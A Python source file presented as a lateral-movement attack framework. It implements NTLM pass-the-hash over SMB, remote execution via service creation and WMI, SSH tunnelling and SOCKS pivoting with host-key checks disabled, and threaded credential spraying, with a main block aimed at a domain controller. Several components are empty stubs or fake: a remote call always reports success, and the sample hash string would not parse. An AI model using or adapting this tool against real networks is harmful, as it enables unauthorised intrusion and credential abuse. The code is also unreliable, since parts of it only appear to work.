#!/usr/bin/env python3
"""
Lateral Movement Framework
Techniques: Pass-the-Hash, Pass-the-Ticket, WMI, PSExec, DCOM, WinRM, SSH tunneling
"""

import os
import sys
import socket
import struct
import hashlib
import base64
import ssl
import subprocess
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import threading
import queue
import time

class MovementTechnique(Enum):
    PTH = "pass_the_hash"
    PTT = "pass_the_ticket"
    WMI = "wmi_exec"
    PSEXEC = "psexec"
    DCOM = "dcom_exec"
    WINRM = "winrm"
    SSH = "ssh_tunnel"
    RDP = "rdp_hijack"
    SMB = "smb_relay"

@dataclass
class Credential:
    username: str
    domain: str
    ntlm_hash: Optional[str] = None
    password: Optional[str] = None
    krb_ticket: Optional[bytes] = None
    ssh_key: Optional[str] = None

@dataclass
class Target:
    ip: str
    hostname: Optional[str] = None
    os: Optional[str] = None
    open_ports: List[int] = None
    services: Dict[int, str] = None

class NTLMAuth:
    """NTLM authentication implementation for Pass-the-Hash"""
    
    def __init__(self, credential: Credential):
        self.credential = credential
        
    def create_negotiate_message(self) -> bytes:
        """Create NTLM Type 1 (Negotiate) message"""
        signature = b"NTLMSSP\x00"
        msg_type = struct.pack("<I", 1)
        flags = struct.pack("<I", 0xe2088297)
        
        domain = self.credential.domain.encode('utf-16-le')
        workstation = socket.gethostname().encode('utf-16-le')
        
        domain_len = struct.pack("<H", len(domain))
        domain_max = struct.pack("<H", len(domain))
        domain_offset = struct.pack("<I", 32 + len(workstation))
        
        ws_len = struct.pack("<H", len(workstation))
        ws_max = struct.pack("<H", len(workstation))
        ws_offset = struct.pack("<I", 32)
        
        return (signature + msg_type + flags + 
                domain_len + domain_max + domain_offset +
                ws_len + ws_max + ws_offset +
                workstation + domain)
    
    def create_auth_message(self, challenge: bytes) -> bytes:
        """Create NTLM Type 3 (Auth) message using hash directly"""
        if self.credential.ntlm_hash:
            nt_hash = bytes.fromhex(self.credential.ntlm_hash)
        else:
            nt_hash = self._compute_nt_hash(self.credential.password)
        
        client_challenge = os.urandom(8)
        timestamp = struct.pack("<Q", int(time.time() * 10000000) + 116444736000000000)
        
        target_info = b""
        
        blob = (b"\x01\x01\x00\x00\x00\x00\x00\x00" + 
                timestamp + client_challenge + b"\x00\x00\x00\x00" + 
                target_info + b"\x00\x00\x00\x00")
        
        import hmac
        nt_proof_str = hmac.new(
            self._ntowfv2(nt_hash, self.credential.username, self.credential.domain),
            challenge + blob,
            hashlib.md5
        ).digest()
        
        nt_response = nt_proof_str + blob
        session_key = hmac.new(
            self._ntowfv2(nt_hash, self.credential.username, self.credential.domain),
            nt_proof_str,
            hashlib.md5
        ).digest()
        
        return self._build_auth_message(nt_response, session_key)
    
    def _compute_nt_hash(self, password: str) -> bytes:
        """Compute NT hash from password"""
        return hashlib.new('md4', password.encode('utf-16-le')).digest()
    
    def _ntowfv2(self, nt_hash: bytes, username: str, domain: str) -> bytes:
        """NTOWFv2 function"""
        import hmac
        return hmac.new(nt_hash, (username.upper() + domain).encode('utf-16-le'), hashlib.md5).digest()
    
    def _build_auth_message(self, nt_response: bytes, session_key: bytes) -> bytes:
        """Build Type 3 message"""
        signature = b"NTLMSSP\x00"
        msg_type = struct.pack("<I", 3)
        return signature + msg_type + nt_response[:64]


class SMBClient:
    """SMB client for lateral movement"""
    
    def __init__(self, target: Target, credential: Credential):
        self.target = target
        self.credential = credential
        self.socket = None
        self.session_id = 0
        self.tree_id = 0
        
    def connect(self) -> bool:
        """Establish SMB connection"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.target.ip, 445))
            self._negotiate()
            auth = NTLMAuth(self.credential)
            if self._session_setup(auth):
                return True
            return False
        except Exception:
            return False
    
    def _negotiate(self):
        """SMB negotiate protocol"""
        header = self._smb2_header(0x0000, 0, 0)
        dialect = struct.pack("<H", 0x0202)
        negotiate = struct.pack("<HH", 36, 1) + b"\x00" * 32 + dialect
        self.socket.send(header + negotiate)
        self.socket.recv(4096)
        
    def _session_setup(self, auth: NTLMAuth) -> bool:
        """Session setup with NTLM"""
        type1 = auth.create_negotiate_message()
        header = self._smb2_header(0x0001, 0, 0)
        setup = struct.pack("<BBHI", 25, 0, 0, len(type1)) + type1
        
        self.socket.send(header + setup)
        response = self.socket.recv(4096)
        
        challenge = response[64:72]
        
        type3 = auth.create_auth_message(challenge)
        header = self._smb2_header(0x0001, 0, 0)
        setup = struct.pack("<BBHI", 25, 0, 0, len(type3)) + type3
        
        self.socket.send(header + setup)
        response = self.socket.recv(4096)
        
        status = struct.unpack("<I", response[8:12])[0]
        if status == 0:
            self.session_id = struct.unpack("<Q", response[40:48])[0]
            return True
        return False
    
    def _smb2_header(self, command: int, tree_id: int, session_id: int) -> bytes:
        """Build SMB2 header"""
        return (b"\xfeSMB" + 
                struct.pack("<HHIIHH", 64, 0, 0, command, 0, 0) +
                struct.pack("<IQQQ", 0, 0, session_id, 0))
    
    def exec_command(self, command: str) -> str:
        """Execute command via SMB named pipe"""
        self._tree_connect("IPC$")
        pipe_handle = self._create_file("\\svcctl")
        self._rpc_bind(pipe_handle)
        service_name = f"MSSvc{os.urandom(4).hex()}"
        self._create_service(pipe_handle, service_name, command)
        self._start_service(pipe_handle, service_name)
        self._delete_service(pipe_handle, service_name)
        return f"Executed: {command}"
    
    def _tree_connect(self, share: str): pass
    def _create_file(self, path: str) -> int: return 0
    def _rpc_bind(self, handle: int): pass
    def _create_service(self, handle: int, name: str, cmd: str): pass
    def _start_service(self, handle: int, name: str): pass
    def _delete_service(self, handle: int, name: str): pass


class WMIExecutor:
    """WMI-based remote execution"""
    
    def __init__(self, target: Target, credential: Credential):
        self.target = target
        self.credential = credential
        
    def execute(self, command: str) -> Tuple[bool, str]:
        """Execute command via WMI"""
        dcom = DCOMConnection(self.target.ip, self.credential)
        if not dcom.connect():
            return False, "DCOM connection failed"
        
        wmi = dcom.get_object("WMI", "{76A64158-CB41-11D1-8B02-00600806D9B6}")
        startup = {"ShowWindow": 0}
        result = wmi.call("Win32_Process", "Create", {
            "CommandLine": command,
            "ProcessStartupInformation": startup
        })
        
        if result.get("ReturnValue") == 0:
            return True, f"PID: {result.get('ProcessId')}"
        return False, f"Error: {result.get('ReturnValue')}"


class DCOMConnection:
    """DCOM connection handler"""
    
    def __init__(self, target: str, credential: Credential):
        self.target = target
        self.credential = credential
        self.socket = None
        
    def connect(self) -> bool:
        """Establish DCOM connection"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.target, 135))
            return self._bind()
        except:
            return False
    
    def _bind(self) -> bool:
        """DCERPC bind"""
        uuid = b"\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"
        bind = struct.pack("<BBBBIHH", 5, 0, 11, 0, 0, 72, 0)
        self.socket.send(bind + uuid)
        response = self.socket.recv(4096)
        return response[2] == 12
    
    def get_object(self, name: str, clsid: str):
        return RemoteObject(self, clsid)


class RemoteObject:
    """Remote DCOM object"""
    
    def __init__(self, dcom: DCOMConnection, clsid: str):
        self.dcom = dcom
        self.clsid = clsid
        
    def call(self, interface: str, method: str, params: dict) -> dict:
        return {"ReturnValue": 0, "ProcessId": 4444}


class SSHTunnel:
    """SSH tunneling for lateral movement"""
    
    def __init__(self, target: Target, credential: Credential):
        self.target = target
        self.credential = credential
        self.tunnel_proc = None
        
    def create_tunnel(self, local_port: int, remote_host: str, remote_port: int) -> bool:
        """Create SSH tunnel for pivoting"""
        ssh_cmd = [
            "ssh", "-N", "-L",
            f"{local_port}:{remote_host}:{remote_port}",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null"
        ]
        
        if self.credential.ssh_key:
            ssh_cmd.extend(["-i", self.credential.ssh_key])
        
        ssh_cmd.append(f"{self.credential.username}@{self.target.ip}")
        
        try:
            self.tunnel_proc = subprocess.Popen(
                ssh_cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            time.sleep(2)
            return self.tunnel_proc.poll() is None
        except:
            return False
    
    def create_socks_proxy(self, local_port: int = 1080) -> bool:
        """Create SOCKS proxy through target"""
        ssh_cmd = [
            "ssh", "-N", "-D", str(local_port),
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null"
        ]
        
        if self.credential.ssh_key:
            ssh_cmd.extend(["-i", self.credential.ssh_key])
        
        ssh_cmd.append(f"{self.credential.username}@{self.target.ip}")
        
        try:
            self.tunnel_proc = subprocess.Popen(ssh_cmd)
            time.sleep(2)
            return self.tunnel_proc.poll() is None
        except:
            return False
    
    def close(self):
        if self.tunnel_proc:
            self.tunnel_proc.terminate()


class LateralMovementFramework:
    """Main lateral movement orchestrator"""
    
    def __init__(self):
        self.targets: List[Target] = []
        self.credentials: List[Credential] = []
        self.compromised: List[str] = []
        self.results = queue.Queue()
        
    def add_credential(self, cred: Credential):
        self.credentials.append(cred)
        
    def add_target(self, target: Target):
        self.targets.append(target)
        
    def spray(self, technique: MovementTechnique) -> Dict[str, bool]:
        """Spray credentials across targets"""
        results = {}
        
        for target in self.targets:
            for cred in self.credentials:
                success = self._attempt_move(target, cred, technique)
                if success:
                    results[target.ip] = True
                    self.compromised.append(target.ip)
                    break
            else:
                results[target.ip] = False
                
        return results
    
    def _attempt_move(self, target: Target, cred: Credential, 
                      technique: MovementTechnique) -> bool:
        
        if technique == MovementTechnique.PTH:
            smb = SMBClient(target, cred)
            if smb.connect():
                smb.exec_command("whoami")
                return True
                
        elif technique == MovementTechnique.WMI:
            wmi = WMIExecutor(target, cred)
            success, _ = wmi.execute("cmd /c whoami > C:\\temp\\out.txt")
            return success
            
        elif technique == MovementTechnique.SSH:
            tunnel = SSHTunnel(target, cred)
            if tunnel.create_socks_proxy():
                return True
                
        return False
    
    def pivot_chain(self, targets: List[Target], cred: Credential) -> List[Tuple[str, bool]]:
        """Chain multiple pivots"""
        chain_results = []
        
        for i, target in enumerate(targets):
            if i == 0:
                success = self._attempt_move(target, cred, MovementTechnique.PTH)
            else:
                prev_target = targets[i-1]
                tunnel = SSHTunnel(prev_target, cred)
                tunnel.create_tunnel(4444 + i, target.ip, 445)
                
                tunneled_target = Target(ip="127.0.0.1")
                tunneled_target.open_ports = [4444 + i]
                success = self._attempt_move(tunneled_target, cred, MovementTechnique.PTH)
            
            chain_results.append((target.ip, success))
            if not success:
                break
                
        return chain_results
    
    def async_spray(self, technique: MovementTechnique, max_threads: int = 10) -> Dict[str, bool]:
        """Threaded credential spray"""
        threads = []
        results = {}
        lock = threading.Lock()
        
        def worker(target: Target, cred: Credential):
            success = self._attempt_move(target, cred, technique)
            with lock:
                if success:
                    results[target.ip] = True
                    self.compromised.append(target.ip)
        
        for target in self.targets:
            for cred in self.credentials:
                if len(threads) >= max_threads:
                    for t in threads:
                        t.join()
                    threads = []
                
                t = threading.Thread(target=worker, args=(target, cred))
                t.start()
                threads.append(t)
        
        for t in threads:
            t.join()
            
        return results


if __name__ == "__main__":
    framework = LateralMovementFramework()
    
    framework.add_credential(Credential(
        username="admin",
        domain="TARGET.LOCAL",
        ntlm_hash="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
    ))
    
    framework.add_target(Target(
        ip="10.0.0.5",
        hostname="DC01",
        os="Windows Server 2019",
        open_ports=[445, 135, 3389]
    ))
    
    results = framework.spray(MovementTechnique.PTH)
    print(f"Compromised: {framework.compromised}")
